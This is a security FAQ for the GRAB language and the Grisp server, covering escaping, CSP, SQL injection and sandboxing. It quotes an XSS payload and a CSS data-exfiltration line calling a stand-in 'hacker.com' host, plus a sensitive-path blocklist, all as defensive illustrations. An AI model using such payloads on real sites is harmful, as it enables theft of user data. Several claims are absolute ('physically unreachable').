# GRAB & Grisp: Security Architecture & Benefits FAQ

This guide explains the built-in security features, threat model, and defense-in-depth protections of the **GRAB Programming Language** and the **Grisp Application Server** in clear, approachable English for creators, developers, and security auditors.

---

## Executive Summary: Security by Default

Unlike legacy web stacks where security is an afterthought requiring dozens of third-party plugins, **GRAB and Grisp were engineered from day one with a default-deny, zero-trust architecture**:

1. **Context-Aware Template Auto-Escaping:** Prevents Cross-Site Scripting (XSS) before HTML ever leaves the server.
2. **Built-in Content Security Policy (CSP):** Automatically blocks untrusted scripts, unauthorized external data leaks, and clickjacking.
3. **Loopback Server Isolation:** Grisp runs on private internal loopback ports (`127.0.0.1:8765–8772`) behind an edge proxy (Nginx or Caddy), with raw backend ports completely invisible to the public internet.
4. **Strict Default-Deny Capabilities:** GRAB code cannot read files, write files, call external networks, or query databases without explicit, operator-granted CLI permissions (`--allow-read`, `--allow-write`, `--allow-net`, `--allow-db`).
5. **Zero Dynamic SQL:** Database access uses strict literal prepared statements; string-concatenated SQL queries are impossible by language design.

---

## Frequently Asked Questions (FAQ)

### Q1: Can a visitor or hacker modify our website using Chrome DevTools?
**No. Nothing in Chrome DevTools touches your server or affects other visitors.**

- **How it works:** When someone opens Chrome DevTools (or presses `F12`) and changes colors, text, or CSS rules, **they are only altering the temporary memory inside their own computer monitor**.
- **The Result:** It is like writing on a paper flyer with a pencil at home—it does not alter the original document on the server.
- **Refresh Resets Everything:** As soon as they refresh the page (`F5`), the server re-sends fresh, pristine HTML and CSS. No other user in the world ever sees their local edits.

---

### Q2: Can a hacker inject malicious scripts or malware through user inputs or comments?
**No. GRAB's two-layer shield stops injection automatically.**

1. **Layer 1 — Context-Aware HTML Escaping:**  
   Every dynamic value printed into a `.grab.html` template via `{variable}` is automatically sanitized. If a hacker submits `<script>steal_passwords()</script>` or `<style>...</style>`, GRAB automatically transforms it into harmless text:
   ```html
   &lt;script&gt;steal_passwords()&lt;/script&gt;
   ```
   The browser displays it as plain characters on the screen; it **never** becomes an active executable tag.
2. **Layer 2 — Content Security Policy (`script-src 'none'`):**  
   Even if an untrusted tag somehow reached the browser, Grisp's server header instructs the browser:
   > *"Do not execute any inline scripts or external plugins on this page."*  
   The browser outright refuses to run unauthorized JavaScript.

---

### Q3: Can a hacker steal user data using an injected `<style>` tag?
**No. Grisp's default network rules block external data leaks.**

In rare theoretical attacks on legacy platforms, attackers tried using complex CSS selectors to guess characters and phone home to an external server using background images (e.g., `background-image: url("https://hacker.com/log?char=a")`).

In Grisp, this attack fails completely because:
1. **GRAB Auto-Escaping** prevents attackers from inserting `<style>` tags into user content in the first place.
2. **`default-src 'self'`** instructs the browser to block connections to any outside domain (`hacker.com`). The browser refuses to send the request.

---

### Q4: Why did our dark-mode styling initially appear as plain text, and how was it solved?
**It was Grisp's strict security policy in action, protecting the visitor.**

By default, Grisp sends an ultra-strict security header (`Content-Security-Policy: default-src 'self'`). This told modern browsers:
> *"Only load stylesheets from dedicated external files (like `/style.css`). Block styling written directly inside the HTML page (`<style>...</style>`) unless explicitly authorized."*

Because our initial test template had CSS directly inside `<style>` tags in the HTML, the browser followed Grisp's strict instructions and fell back to unstyled text.

**The Solution:**  
We updated the edge reverse proxy (Nginx) to explicitly authorize `style-src 'self' 'unsafe-inline'`. This permits visual CSS styling while continuing to 100% block all JavaScript execution (`script-src 'none'`) and object embeds (`object-src 'none'`).

---

### Q5: How does GRAB protect databases from SQL Injection?
**SQL injection is eliminated at the compiler level.**

Unlike PHP or Python where developers might accidentally construct SQL queries using string concatenation (`"SELECT * FROM users WHERE id = " + userInput`), **GRAB 0.7 does not permit dynamic raw SQL strings**:
- All queries must be declared as static prepared statements with typed parameters (`using id`).
- Values are passed through bound parameters directly to SQLite, MariaDB, or PostgreSQL.
- User input is never parsed by the database engine as executable SQL code.

---

### Q6: How does loopback isolation protect the Grisp server on a VPS?
**Grisp is physically unreachable from the public internet.**

- **Edge Gatekeeper:** Nginx or Caddy listens on public ports `80` (HTTP) and `443` (HTTPS) to handle TLS encryption and rate limiting.
- **Loopback Binding:** Grisp binds strictly to private loopback IP `127.0.0.1:8765`.
- **Firewall Guard:** The VPS firewall (`ufw`) drops all incoming traffic targeting port `8765`. 
- **Benefit:** Hackers cannot probe, scan, or exploit backend server ports directly. All traffic must pass through the hardened edge proxy.

---

### Q7: How does GRAB protect the server filesystem and operating system?
**The engine operates in strict default-deny sandbox mode.**

Even if an application contains buggy code, GRAB prevents unauthorized host access:
- **Default-Deny Files:** GRAB cannot read or write to any directory unless explicitly authorized via `--allow-read <dir>` or `--allow-write <dir>`.
- **Sensitive Path Blocklist:** System directories like `/etc/`, `/root/`, `/proc/`, and Windows system directories are hard-blocked by error code `GRAB-E401`.
- **Default-Deny Network:** Outbound network requests are completely forbidden unless granted via `--allow-net <host>`. Server-Side Request Forgery (SSRF) to private IPs and cloud metadata endpoints (`169.254.169.254`) is blocked by error code `GRAB-E402`.

---

## Security Comparison Matrix

| Security Feature | Traditional PHP / WordPress | Standard Node.js / Express | **GRAB + Grisp** |
| :--- | :--- | :--- | :--- |
| **HTML Auto-Escaping** | Manual (frequently forgotten) | Manual / Framework-dependent | **Automatic & Context-Aware** |
| **Content Security Policy** | Requires plugins | Requires manual middleware | **Built-in & Hardened by Default** |
| **SQL Injection Protection** | Optional ORM / manual escaping | Optional ORM | **Enforced at Language Level** |
| **Filesystem Access** | Full host access by default | Full host access by default | **Default-Deny (`--allow-read`)** |
| **Network Egress (SSRF)** | Unrestricted | Unrestricted | **Default-Deny (`--allow-net`)** |
| **Public Port Exposure** | Often exposed directly | Often exposed directly | **Loopback Only (`127.0.0.1`)** |
| **Server Crash Containment** | Process crash affects all users | Unhandled error crashes server | **Per-Request Panic Containment** |

---

## Printable / PDF Version

A visual, printable version of this guide is available at:
`docs/features/security_faq.html`

To save as a clean PDF:
1. Open `docs/features/security_faq.html` in your web browser.
2. Click the **"Print / Save as PDF"** button (or press `Ctrl + P`).
3. Select **"Save as PDF"** in the destination menu.
